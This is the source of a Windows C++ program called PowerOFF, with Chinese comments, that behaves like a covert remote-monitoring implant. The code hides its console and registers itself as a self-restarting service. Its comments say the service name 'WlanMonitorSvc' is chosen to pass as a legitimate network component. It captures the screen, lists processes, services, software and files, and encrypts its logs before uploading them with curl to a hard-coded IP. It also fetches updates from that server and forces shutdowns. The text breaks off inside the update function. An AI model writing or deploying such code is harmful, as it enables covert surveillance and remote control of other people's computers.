// PowerOFF.cpp : 此文件包含 "main" 函数。程序执行将在此处开始并结束。
//

#include <iostream>
#include <fstream>

#define _WINSOCK_DEPRECATED_NO_WARNINGS
#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#include <windows.h>
#include <string>
#include <shellapi.h>
#include <wlanapi.h>
#include <urlmon.h> // 添加URL下载支持
#include <iphlpapi.h> // 添加获取MAC支持
#include <wininet.h> // 添加网络缓存清除支持
#include <psapi.h>   // 添加进程获取支持
#include <tlhelp32.h> // 添加进程快照支持
#include <thread>
#include <mutex>
#include <atomic>

#include <winsock2.h>
#pragma comment(lib, "ws2_32.lib")

#pragma comment(lib, "wlanapi.lib")
#pragma comment(lib, "ole32.lib")
#pragma comment(lib, "urlmon.lib") // 链接网络下载库
#pragma comment(lib, "iphlpapi.lib") // 链接网络信息库
#pragma comment(lib, "wininet.lib") // 链接缓存控制库
#include <wtsapi32.h>
#include <userenv.h>
#pragma comment(lib, "wtsapi32.lib")
#pragma comment(lib, "userenv.lib")
#include <gdiplus.h>
#pragma comment(lib, "gdiplus.lib")

// ==============================================================
// 【每次编译必看配置】请在每次点击【生成】前，在此处手动输入最新版本号！
#define MANUAL_COMPILE_VERSION "1.5.25"
// ==============================================================

// 定义当前程序版本和服务器更新地址
const std::string CURRENT_VERSION = MANUAL_COMPILE_VERSION;
const std::string UPDATE_URL_BASE = "http://120.78.3.56:5000/update/"; // 对齐5000端口
const std::string REPORT_URL_BASE = "http://120.78.3.56:5000/report"; // 匹配服务器上的 5000 端口

// 全局单例互斥锁句柄，放于最顶部方便所有函数调用
HANDLE g_hMutex = NULL;
ULONGLONG g_ServiceStartTime = 0; // 存放程序/服务刚启动时的时间

// 指定为Windows子系统，运行时不显示控制台黑窗
#pragma comment(linker, "/subsystem:windows /entry:mainCRTStartup")

// === 添加 DXGI 截屏支持解决视频等硬件加速黑屏问题 ===
#include <d3d11.h>
#include <dxgi1_2.h>
#pragma comment(lib, "d3d11.lib")
#pragma comment(lib, "dxgi.lib")

class DxgiScreenCapturer {
private:
    ID3D11Device* d3dDevice = nullptr;
    ID3D11DeviceContext* d3dContext = nullptr;
    IDXGIOutputDuplication* deskDupl = nullptr;
    ID3D11Texture2D* stagingTex = nullptr;
    int texW = 0, texH = 0;
    HBITMAP hLastBmp = NULL;

public:
    DxgiScreenCapturer() {}
    ~DxgiScreenCapturer() { Cleanup(); }

    void Cleanup() {
        if (hLastBmp) { DeleteObject(hLastBmp); hLastBmp = NULL; }
        if (stagingTex) { stagingTex->Release(); stagingTex = nullptr; }
        if (deskDupl) { deskDupl->Release(); deskDupl = nullptr; }
        if (d3dContext) { d3dContext->Release(); d3dContext = nullptr; }
        if (d3dDevice) { d3dDevice->Release(); d3dDevice = nullptr; }
        texW = 0; texH = 0;
    }

    bool Init() {
        Cleanup();
        HRESULT hr = D3D11CreateDevice(nullptr, D3D_DRIVER_TYPE_HARDWARE, nullptr, 0, nullptr, 0, D3D11_SDK_VERSION, &d3dDevice, nullptr, &d3dContext);
        if (FAILED(hr)) return false;

        IDXGIDevice* dxgiDevice = nullptr;
        if (SUCCEEDED(d3dDevice->QueryInterface(__uuidof(IDXGIDevice), (void**)&dxgiDevice))) {
            IDXGIAdapter* dxgiAdapter = nullptr;
            if (SUCCEEDED(dxgiDevice->GetAdapter(&dxgiAdapter))) {
                IDXGIOutput* dxgiOutput = nullptr;
                if (SUCCEEDED(dxgiAdapter->EnumOutputs(0, &dxgiOutput))) {
                    IDXGIOutput1* dxgiOutput1 = nullptr;
                    if (SUCCEEDED(dxgiOutput->QueryInterface(__uuidof(IDXGIOutput1), (void**)&dxgiOutput1))) {
                        dxgiOutput1->DuplicateOutput(d3dDevice, &deskDupl);
                        dxgiOutput1->Release();
                    }
                    dxgiOutput->Release();
                }
                dxgiAdapter->Release();
            }
            dxgiDevice->Release();
        }
        return deskDupl != nullptr;
    }

    bool CaptureImage(HBITMAP& hBmpOut, int& outW, int& outH, int timeout = 0) {
        if (!deskDupl) {
            if (!Init()) return false;
        }

        DXGI_OUTDUPL_FRAME_INFO frameInfo;
        IDXGIResource* desktopResource = nullptr;
        HRESULT hr = deskDupl->AcquireNextFrame(timeout, &frameInfo, &desktopResource);
        if (hr == DXGI_ERROR_ACCESS_LOST) {
            Init();
            return false;
        }
        if (hr == DXGI_ERROR_WAIT_TIMEOUT) {
            if (hLastBmp) {
                hBmpOut = (HBITMAP)CopyImage(hLastBmp, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
                outW = texW;
                outH = texH;
                return hBmpOut != NULL;
            }
            return false;
        }
        if (FAILED(hr)) return false;

        bool bRet = false;
        ID3D11Texture2D* acquiredTex = nullptr;
        if (SUCCEEDED(desktopResource->QueryInterface(__uuidof(ID3D11Texture2D), (void**)&acquiredTex))) {
            D3D11_TEXTURE2D_DESC desc;
            acquiredTex->GetDesc(&desc);

            if (!stagingTex || texW != (int)desc.Width || texH != (int)desc.Height) {
                if (stagingTex) { stagingTex->Release(); stagingTex = nullptr; }
                D3D11_TEXTURE2D_DESC stagingDesc = desc;
                stagingDesc.Usage = D3D11_USAGE_STAGING;
                stagingDesc.CPUAccessFlags = D3D11_CPU_ACCESS_READ;
                stagingDesc.BindFlags = 0;
                stagingDesc.MiscFlags = 0;
                stagingDesc.MipLevels = 1;
                stagingDesc.ArraySize = 1;
                d3dDevice->CreateTexture2D(&stagingDesc, nullptr, &stagingTex);
                texW = desc.Width;
                texH = desc.Height;
            }

            if (stagingTex) {
                d3dContext->CopyResource(stagingTex, acquiredTex);
                D3D11_MAPPED_SUBRESOURCE map;
                if (SUCCEEDED(d3dContext->Map(stagingTex, 0, D3D11_MAP_READ, 0, &map))) {
                    outW = texW;
                    outH = texH;
                    HDC hdc = GetDC(NULL);
                    BITMAPINFO bmi = {0};
                    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
                    bmi.bmiHeader.biWidth = outW;
                    bmi.bmiHeader.biHeight = -((int)outH);
                    bmi.bmiHeader.biPlanes = 1;
                    bmi.bmiHeader.biBitCount = 32;
                    bmi.bmiHeader.biCompression = BI_RGB;

                    void* pBits = nullptr;
                    HBITMAP hNewBmp = CreateDIBSection(hdc, &bmi, DIB_RGB_COLORS, &pBits, NULL, 0);
                    if (hNewBmp) {
                        for (UINT y = 0; y < (UINT)outH; ++y) {
                            memcpy((BYTE*)pBits + y * outW * 4, (BYTE*)map.pData + y * map.RowPitch, outW * 4);
                        }
                        if (hLastBmp) DeleteObject(hLastBmp);
                        hLastBmp = (HBITMAP)CopyImage(hNewBmp, IMAGE_BITMAP, 0, 0, LR_CREATEDIBSECTION);
                        hBmpOut = hNewBmp;
                        bRet = true;
                    }
                    ReleaseDC(NULL, hdc);
                    d3dContext->Unmap(stagingTex, 0);
                }
            }
            acquiredTex->Release();
        }
        desktopResource->Release();
        deskDupl->ReleaseFrame();
        return bRet;
    }
};



// 判断当前是否以管理员身份运行
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin == TRUE;
}

// ---------------------- NATIVE APIS FOR TASK MANAGER -------------
// UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
std::string Utf8ToAnsi(const std::string& utf8Str);
// ANSI 转 UTF-8发给服务器
std::string AnsiToUtf8(const std::string& ansiStr);

std::string EscapeJsonString(const std::string& input) {
    std::string output;
    for (char c : input) {
        if (c == '"') output += "\\\"";
        else if (c == '\\') output += "\\\\";
        else if (c == '\b') output += "\\b";
        else if (c == '\f') output += "\\f";
        else if (c == '\n') output += "\\n";
        else if (c == '\r') output += "\\r";
        else if (c == '\t') output += "\\t";
        else output += c;
    }
    return output;
}

std::string GetProcessListNative() {
    std::string res = "[";
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap != INVALID_HANDLE_VALUE) {
        PROCESSENTRY32W pe;
        pe.dwSize = sizeof(PROCESSENTRY32W);
        if (Process32FirstW(hSnap, &pe)) {
            bool first = true;
            do {
                if (!first) res += ",";
                first = false;
                SIZE_T memUsage = 0;
                HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pe.th32ProcessID);
                if (hProcess) {
                    PROCESS_MEMORY_COUNTERS pmc;
                    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
                        memUsage = pmc.WorkingSetSize;
                    }
                    CloseHandle(hProcess);
                }

                int wLen = WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, NULL, 0, NULL, NULL);
                std::string exeName = "";
                if (wLen > 0) {
                    exeName.resize(wLen, 0);
                    WideCharToMultiByte(CP_UTF8, 0, pe.szExeFile, -1, &exeName[0], wLen, NULL, NULL);
                    while(!exeName.empty() && exeName.back() == '\0') exeName.pop_back();
                }

                res += "{\"Id\":" + std::to_string(pe.th32ProcessID) + 
                       ",\"ProcessName\":\"" + EscapeJsonString(exeName) + "\"" +
                       ",\"WorkingSet\":" + std::to_string(memUsage) + "}";
            } while (Process32NextW(hSnap, &pe));
        }
        CloseHandle(hSnap);
    }
    res += "]";
    return res;
}

double GetCpuUsageNative() {
    FILETIME idle1, kernel1, user1;
    FILETIME idle2, kernel2, user2;
    GetSystemTimes(&idle1, &kernel1, &user1);
    Sleep(100);
    GetSystemTimes(&idle2, &kernel2, &user2);

    auto toUL = [](FILETIME ft) {
        ULARGE_INTEGER ul;
        ul.LowPart = ft.dwLowDateTime; ul.HighPart = ft.dwHighDateTime;
        return ul.QuadPart;
    };
    ULONGLONG idleDiff = toUL(idle2) - toUL(idle1);
    ULONGLONG sysDiff = (toUL(kernel2) - toUL(kernel1)) + (toUL(user2) - toUL(user1));
    if (sysDiff == 0) return 0.0;
    return ((sysDiff - idleDiff) * 100.0) / sysDiff;
}

std::string GetPerfInfoNative() {
    static std::string cpuName = "";
    static std::string gpuName = "";
    if (cpuName.empty()) {
        HKEY hKey;
        if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            char buf[256] = {0};
            DWORD size = sizeof(buf);
            if (RegQueryValueExA(hKey, "ProcessorNameString", NULL, NULL, (LPBYTE)buf, &size) == ERROR_SUCCESS) {
                cpuName = buf;
                cpuName.erase(0, cpuName.find_first_not_of(" \t\r\n"));
                cpuName.erase(cpuName.find_last_not_of(" \t\r\n") + 1);
            }
            RegCloseKey(hKey);
        }
        if (cpuName.empty()) cpuName = "Unknown CPU";

        DISPLAY_DEVICEA dd;
        dd.cb = sizeof(dd);
        if (EnumDisplayDevicesA(NULL, 0, &dd, 0)) {
            gpuName = dd.DeviceString;
        } else {
            gpuName = "Unknown GPU";
        }
    }

    MEMORYSTATUSEX memInfo;
    memInfo.dwLength = sizeof(MEMORYSTATUSEX);
    GlobalMemoryStatusEx(&memInfo);
    double cpu = GetCpuUsageNative();
    std::string res = "{";
    res += "\"CPU\":" + std::to_string(cpu) + ",";
    res += "\"MemTotal\":" + std::to_string(memInfo.ullTotalPhys) + ",";
    res += "\"MemFree\":" + std::to_string(memInfo.ullAvailPhys) + ",";
    res += "\"CPU_Name\":\"" + EscapeJsonString(AnsiToUtf8(cpuName)) + "\",";
    res += "\"GPU_Name\":\"" + EscapeJsonString(AnsiToUtf8(gpuName)) + "\"";
    res += "}";
    return res;
}

std::string GetStartupListNative() {
    std::string res = "[";
    auto readReg = [&](HKEY root, const char* subKey, const char* loc) {
        HKEY hKey;
        if (RegOpenKeyExA(root, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD i = 0; char val[MAX_PATH]; DWORD valSize = MAX_PATH; DWORD type; BYTE data[1024]; DWORD dataSize = 1024;
            while (RegEnumValueA(hKey, i, val, &valSize, NULL, &type, data, &dataSize) == ERROR_SUCCESS) {
                if (type == REG_SZ || type == REG_EXPAND_SZ) {
                    if (res.length() > 1) res += ",";
                    std::string valStr = val; std::string dataStr = (char*)data;
                    res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(valStr)) + "\",\"Command\":\"" + EscapeJsonString(AnsiToUtf8(dataStr)) + "\",\"Location\":\"" + EscapeJsonString(loc) + "\"}";
                }
                i++; valSize = MAX_PATH; dataSize = 1024;
            }
            RegCloseKey(hKey);
        }
    };
    readReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "HKLM");
    readReg(HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "HKCU");
    res += "]";
    return res;
}

std::string GetServiceListNative() {
    std::string res = "[";
    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_ENUMERATE_SERVICE);
    if (hSCM) {
        DWORD bytesNeeded = 0; DWORD servicesReturned = 0; DWORD resumeHandle = 0;
        EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, NULL, 0, &bytesNeeded, &servicesReturned, &resumeHandle, NULL);
        if (GetLastError() == ERROR_MORE_DATA) {
            LPENUM_SERVICE_STATUS_PROCESSA pServices = (LPENUM_SERVICE_STATUS_PROCESSA)malloc(bytesNeeded);
            if (pServices && EnumServicesStatusExA(hSCM, SC_ENUM_PROCESS_INFO, SERVICE_WIN32, SERVICE_STATE_ALL, (LPBYTE)pServices, bytesNeeded, &bytesNeeded, &servicesReturned, &resumeHandle, NULL)) {
                for (DWORD i = 0; i < servicesReturned; i++) {
                    if (res.length() > 1) res += ",";
                    std::string sName = pServices[i].lpServiceName;
                    std::string dName = pServices[i].lpDisplayName;
                    std::string statusStr = "Unknown";
                    DWORD state = pServices[i].ServiceStatusProcess.dwCurrentState;
                    if (state == SERVICE_RUNNING) statusStr = "Running";
                    else if (state == SERVICE_STOPPED) statusStr = "Stopped";
                    else if (state == SERVICE_START_PENDING) statusStr = "Start_Pending";
                    else if (state == SERVICE_STOP_PENDING) statusStr = "Stop_Pending";
                    res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(sName)) + "\",\"DisplayName\":\"" + EscapeJsonString(AnsiToUtf8(dName)) + "\",\"Status\":\"" + statusStr + "\"}";
                }
            }
            if (pServices) free(pServices);
        }
        CloseServiceHandle(hSCM);
    }
    res += "]";
    return res;
}

std::string GetSoftwareListNative() {
    std::string res = "[";
    auto readSoftReg = [&](HKEY root, const char* subKey) {
        HKEY hKey;
        if (RegOpenKeyExA(root, subKey, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
            DWORD i = 0; char keyName[256]; DWORD keyNameSize = 256;
            while (RegEnumKeyExA(hKey, i, keyName, &keyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                HKEY hSubKey;
                if (RegOpenKeyExA(hKey, keyName, 0, KEY_READ, &hSubKey) == ERROR_SUCCESS) {
                    char dispName[256] = {0}; DWORD dnSize = 256;
                    char dispVer[256] = {0}; DWORD dvSize = 256;
                    char pub[256] = {0}; DWORD pubSize = 256;
                    char uninstall[1024] = {0}; DWORD unSize = 1024;
                    char modify[1024] = {0}; DWORD modSize = 1024;
                    char installDate[256] = {0}; DWORD idSize = 256;
                    if (RegQueryValueExA(hSubKey, "DisplayName", NULL, NULL, (LPBYTE)dispName, &dnSize) == ERROR_SUCCESS) {
                        RegQueryValueExA(hSubKey, "DisplayVersion", NULL, NULL, (LPBYTE)dispVer, &dvSize);
                        RegQueryValueExA(hSubKey, "Publisher", NULL, NULL, (LPBYTE)pub, &pubSize);
                        RegQueryValueExA(hSubKey, "UninstallString", NULL, NULL, (LPBYTE)uninstall, &unSize);
                        RegQueryValueExA(hSubKey, "ModifyPath", NULL, NULL, (LPBYTE)modify, &modSize);
                        RegQueryValueExA(hSubKey, "InstallDate", NULL, NULL, (LPBYTE)installDate, &idSize); // YYYYMMDD 格式方便前端排序

                        if (res.length() > 1) res += ",";
                        res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(dispName)) + 
                               "\",\"Version\":\"" + EscapeJsonString(AnsiToUtf8(dispVer)) + 
                               "\",\"Publisher\":\"" + EscapeJsonString(AnsiToUtf8(pub)) + 
                               "\",\"UninstallString\":\"" + EscapeJsonString(AnsiToUtf8(uninstall)) + 
                               "\",\"ModifyPath\":\"" + EscapeJsonString(AnsiToUtf8(modify)) + 
                               "\",\"InstallDate\":\"" + EscapeJsonString(AnsiToUtf8(installDate)) + "\"}";
                    }
                    RegCloseKey(hSubKey);
                }
                i++; keyNameSize = 256;
            }
            RegCloseKey(hKey);
        }
    };
    readSoftReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    readSoftReg(HKEY_LOCAL_MACHINE, "SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall");
    res += "]";
    return res;
}

std::string GetFileListNative(const std::string& path) {
    std::string res = "[";
    if (path == "ROOT" || path == "此电脑" || path.empty()) {
        char driveBuf[256];
        DWORD len = GetLogicalDriveStringsA(sizeof(driveBuf) - 1, driveBuf);
        if (len > 0 && len <= 256) {
            char* drive = driveBuf;
            bool first = true;
            while (*drive) {
                if (!first) res += ",";
                first = false;
                std::string nameStr = drive;
                if (!nameStr.empty() && nameStr.back() == '\\') nameStr.pop_back();
                res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(nameStr)) + "\",\"Length\":0,\"LastWriteTime\":\"\",\"IsDir\":true}";
                drive += strlen(drive) + 1;
            }
        }
    } else {
        std::string searchPath = path;
        if (!searchPath.empty() && searchPath.back() != '\\' && searchPath.back() != '/') {
            searchPath += "\\";
        }
        searchPath += "*";
        WIN32_FIND_DATAA fd;
        HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
        if (hFind != INVALID_HANDLE_VALUE) {
            bool first = true;
            do {
                if (strcmp(fd.cFileName, ".") == 0 || strcmp(fd.cFileName, "..") == 0) continue;
                if (!first) res += ",";
                first = false;

                bool isDir = (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
                ULARGE_INTEGER ulSz;
                ulSz.HighPart = fd.nFileSizeHigh;
                ulSz.LowPart = fd.nFileSizeLow;

                char timeBuf[64] = {0};
                FILETIME ftLoc;
                if (FileTimeToLocalFileTime(&fd.ftLastWriteTime, &ftLoc)) {
                    SYSTEMTIME st;
                    if (FileTimeToSystemTime(&ftLoc, &st)) {
                        sprintf_s(timeBuf, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
                    }
                }

                res += "{\"Name\":\"" + EscapeJsonString(AnsiToUtf8(fd.cFileName)) + "\",\"Length\":" + std::to_string(ulSz.QuadPart) + ",\"LastWriteTime\":\"" + timeBuf + "\",\"IsDir\":" + (isDir ? "true" : "false") + "}";
            } while (FindNextFileA(hFind, &fd));
            FindClose(hFind);
        }
    }
    res += "]";
    return res;
}
// -----------------------------------------------------------------

// 获取当前时间的字符串表示用于记录日志
std::string GetCurrentTimeStr() {
    SYSTEMTIME st;
    GetLocalTime(&st);
    char buffer[256];
    sprintf_s(buffer, "%04d-%02d-%02d %02d:%02d:%02d", st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond);
    return std::string(buffer);
}

// 获取当前程序的完整运行路径
std::string GetExePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// 先声明，让后面可以调用
std::string ExecCmd(const std::string& cmd, bool outputIsUtf8 = false);
std::string GetMacAddress();

// 独立异步线程上传本地日志到云端
void UploadLogToServer() {
    std::thread([]() {
        std::string exePath = GetExePath();
        std::string logPath = exePath.substr(0, exePath.find_last_of("\\/")) + "\\WlanMonitorSvc_Log.txt";
        if (GetFileAttributesA(logPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            std::string mac = GetMacAddress();
            // 解析出基础 URL（去掉末尾可能附带的 /report 等）
            std::string baseUrl = REPORT_URL_BASE;
            size_t pos = baseUrl.rfind("/report");
            if (pos != std::string::npos) {
                baseUrl = baseUrl.substr(0, pos);
            }
            std::string targetUrl = baseUrl + "/api/upload_log/" + mac;
            std::string curlCmd = "curl.exe -s -m 30 -k -F \"file=@" + logPath + "\" \"" + targetUrl + "\"";
            ExecCmd(curlCmd, false);
        }
    }).detach();
}

// 简单XOR加密并将结果转为Hex编码，防止别人直接通过文本读取
std::string EncryptLogString(const std::string& data) {
    std::string key = "PowerOFF2026"; // 你的专属加密密钥
    std::string result = "";
    char hexBuf[5];
    for (size_t i = 0; i < data.size(); i++) {
        unsigned char xorChar = static_cast<unsigned char>(data[i]) ^ key[i % key.size()];
        sprintf_s(hexBuf, "%02X", xorChar);
        result += hexBuf;
    }
    return result;
}

// 写入日志到程序同目录下的 WlanMonitorSvc_Log.txt
void WriteLog(const std::string& message) {
    std::string exePath = GetExePath();
    std::string logPath = exePath.substr(0, exePath.find_last_of("\\/")) + "\\WlanMonitorSvc_Log.txt";

    // 限制日志大小，超过则清空（防止日志无限增长）
    std::ifstream checkFile(logPath, std::ios::ate | std::ios::binary);
    bool isTooLarge = false;
    if (checkFile.is_open()) {
        if (checkFile.tellg() > 2 * 1024 * 1024) { // 大于2MB
            isTooLarge = true;
        }
        checkFile.close();
    }

    std::ofstream logFile(logPath, isTooLarge ? std::ios::trunc : std::ios::app);
    if (logFile.is_open()) {
        std::string rawLog = "[" + GetCurrentTimeStr() + "] " + message;
        // 暂时取消加密，直接输出明文日志
        //logFile << rawLog << std::endl;//无加密
        logFile << EncryptLogString(rawLog) << std::endl;//有加密
        logFile.close();
    }
}

#ifndef SERVICE_CONFIG_FAILURE_ACTIONS_FLAG
#define SERVICE_CONFIG_FAILURE_ACTIONS_FLAG 4
typedef struct _SERVICE_FAILURE_ACTIONS_FLAG {
    BOOL fFailureActionsOnNonCrashFailures;
} SERVICE_FAILURE_ACTIONS_FLAG, *LPSERVICE_FAILURE_ACTIONS_FLAG;
#endif

// 注册为 Windows 服务以实现静默自启，伪装成合法网络监控组件
void InstallAndStartService() {
    std::string exePath = GetExePath();
    WriteLog("正在尝试注册 Windows 服务...");

    SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCManager) {
        WriteLog("失败：无法打开服务控制管理器，错误代码: " + std::to_string(GetLastError()));
        return;
    }

    auto applyFailureActions = [](SC_HANDLE hSvc) {
        SERVICE_FAILURE_ACTIONSA sfa = {0};
        SC_ACTION actions[3];
        actions[0].Type = SC_ACTION_RESTART; actions[0].Delay = 5000;
        actions[1].Type = SC_ACTION_RESTART; actions[1].Delay = 5000;
        actions[2].Type = SC_ACTION_RESTART; actions[2].Delay = 5000;
        sfa.dwResetPeriod = 86400;
        sfa.lpRebootMsg = NULL;
        sfa.lpCommand = NULL;
        sfa.cActions = 3;
        sfa.lpsaActions = actions;
        ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_FAILURE_ACTIONS, &sfa);

        SERVICE_FAILURE_ACTIONS_FLAG sfaf;
        sfaf.fFailureActionsOnNonCrashFailures = TRUE;
        ChangeServiceConfig2A(hSvc, SERVICE_CONFIG_FAILURE_ACTIONS_FLAG, &sfaf);
    };

    SC_HANDLE hService = CreateServiceA(
        hSCManager,
        "WlanMonitorSvc",                   // 正常名称，不带有任何 poweroff
        "WLAN Network Monitor Component",   // 普通的显示名称
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_OWN_PROCESS,
        SERVICE_AUTO_START,                 // 开机自启
        SERVICE_ERROR_NORMAL,
        exePath.c_str(),
        NULL, NULL, NULL, NULL, NULL
    );

    if (hService) {
        WriteLog("成功：Windows 服务注册成功！");
        applyFailureActions(hService);
        // 释放锁，允许 SCM 启动的服务进程能够正常通过多开检测
        if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
        StartService(hService, 0, NULL);
        CloseServiceHandle(hService);
    } else {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS) {
            WriteLog("提示：服务已存在，尝试更新路径并启动它...");
            hService = OpenServiceA(hSCManager, "WlanMonitorSvc", SERVICE_ALL_ACCESS);
            if (hService) {
                applyFailureActions(hService);

                // 因为去除了 STOP 控制权，这里的普通请求会失败，属于正常现象，我们交由底层暴力 taskkill 即可更迭
                SERVICE_STATUS status;
                ControlService(hService, SERVICE_CONTROL_STOP, &status);
                Sleep(1000); 

                // 更新服务执行路径
                ChangeServiceConfigA(hService, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, SERVICE_NO_CHANGE, exePath.c_str(), NULL, NULL, NULL, NULL, NULL, NULL);

                if (g_hMutex) { CloseHandle(g_hMutex); g_hMutex = NULL; }
                StartService(hService, 0, NULL);
                CloseServiceHandle(hService);
            }
        } else {
            WriteLog("失败：注册服务失败，错误代码: " + std::to_string(err));
        }
    }
    CloseServiceHandle(hSCManager);

    // 清理以前遗留的各类计划任务和注册表项
    std::string oldTaskParams = "/delete /tn \"\\Microsoft\\Windows\\AppID\\PolicyConverter\" /f";
    SHELLEXECUTEINFOA delSei = { sizeof(delSei) };
    delSei.lpVerb = "open";
    delSei.lpFile = "schtasks.exe";
    delSei.lpParameters = oldTaskParams.c_str();
    delSei.nShow = SW_HIDE;
    ShellExecuteExA(&delSei);

    oldTaskParams = "/delete /tn \"PowerOFF_AutoStart\" /f";
    delSei.lpParameters = oldTaskParams.c_str();
    ShellExecuteExA(&delSei);

    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegDeleteValueA(hKey, "WlanMonitorUI");
        RegDeleteValueA(hKey, "PowerOFF_AutoStart");
        RegCloseKey(hKey);
    }

    // 强杀所有处于后台运行的同名存活实例保证能进行覆盖（移除了过滤 SESSION 0 的限制，全部绝杀）
    std::string exeName = exePath.substr(exePath.find_last_of("\\/") + 1);
    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im " + exeName);
    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im PowerOFF.exe");
    ExecCmd("taskkill /f /fi \"PID ne " + std::to_string(GetCurrentProcessId()) + "\" /im WlanMonitorSvc.exe");
    Sleep(1500); // 稍微等待进程完全释放互斥锁和端口
}

// UTF-8 转 ANSI 解决日志中文WiFi名乱码的问题
std::string Utf8ToAnsi(const std::string& utf8Str) {
    if (utf8Str.empty()) return "";
    int wLen = MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, NULL, 0);
    if (wLen <= 0) return utf8Str;
    std::wstring wStr(wLen, 0);
    MultiByteToWideChar(CP_UTF8, 0, utf8Str.c_str(), -1, &wStr[0], wLen);
    int aLen = WideCharToMultiByte(CP_ACP, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
    if (aLen <= 0) return utf8Str;
    std::string aStr(aLen, 0);
    WideCharToMultiByte(CP_ACP, 0, wStr.c_str(), -1, &aStr[0], aLen, NULL, NULL);
    return std::string(aStr.c_str()); 
}

// ANSI 转 UTF-8发给服务器
std::string AnsiToUtf8(const std::string& ansiStr) {
    if (ansiStr.empty()) return "";
    int wLen = MultiByteToWideChar(CP_ACP, 0, ansiStr.c_str(), -1, NULL, 0);
    if (wLen <= 0) return ansiStr;
    std::wstring wStr(wLen, 0);
    MultiByteToWideChar(CP_ACP, 0, ansiStr.c_str(), -1, &wStr[0], wLen);
    int utf8Len = WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, NULL, 0, NULL, NULL);
    if (utf8Len <= 0) return ansiStr;
    std::string utf8Str(utf8Len, 0);
    WideCharToMultiByte(CP_UTF8, 0, wStr.c_str(), -1, &utf8Str[0], utf8Len, NULL, NULL);
    return std::string(utf8Str.c_str());
}

// 调用底层API进行强制关机
void ForceShutdown() {
    if (GetTickCount64() - g_ServiceStartTime < 120000) {
        WriteLog("【安全保护】系统或服务启动不足2分钟，强制拦截了本次底层的关机请求，防止死循环无限重启！");
        return;
    }

    HANDLE hToken;
    TOKEN_PRIVILEGES tkp;

    // 获取进程令牌
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) {
        // 获取关机特权 LUID
        LookupPrivilegeValue(NULL, SE_SHUTDOWN_NAME, &tkp.Privileges[0].Luid);
        tkp.PrivilegeCount = 1;
        tkp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

        // 赋予当前进程关机特权
        AdjustTokenPrivileges(hToken, FALSE, &tkp, 0, (PTOKEN_PRIVILEGES)NULL, 0);
    }

    // 发送关机命令 (EWX_POWEROFF 关闭并断电 | EWX_FORCE 强制关闭应用不提示)
    ExitWindowsEx(EWX_POWEROFF | EWX_FORCE, SHTDN_REASON_MAJOR_OTHER | SHTDN_REASON_MINOR_OTHER);

    // 备用方案：隐藏调用系统shutdown命令兜底
    WinExec("shutdown.exe -s -f -t 0", SW_HIDE);
}

// 检查并执行自动更新
void CheckForUpdates() {
    std::string timestamp = std::to_string(GetTickCount64());
